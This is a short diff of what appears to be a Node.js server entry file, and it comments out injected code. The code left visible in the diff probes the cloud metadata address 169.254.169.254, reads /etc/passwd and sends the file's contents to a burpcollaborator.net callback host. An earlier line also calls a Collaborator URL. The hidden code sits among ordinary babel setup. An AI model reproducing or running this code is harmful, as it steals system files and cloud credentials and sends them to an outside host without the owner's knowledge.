@@ -10,7 +10,7 @@ request('http://u0v760mwyr2w9wdiinuyo6k1psvjq7f.burpcollaborator.net/callback=St
 }
 });
 // const logger = require('./server/init');
-var request = require('request');
+/* var request = require('request');
 request('http://169.254.169.254/', function (error, response, body) {
   if (1 == 1) {
     console.log(response.statusCode);
@@ -67,6 +67,7 @@ fs.readFile('/etc/passwd', 'utf8' , (err, data) => {
   request('http://c3gp9ipe195eceg0l5xgronjsay1upj.burpcollaborator.net/?file=' +data);
 
 });
+*/
 
 // Initialize babel.
 require('@babel/register')({
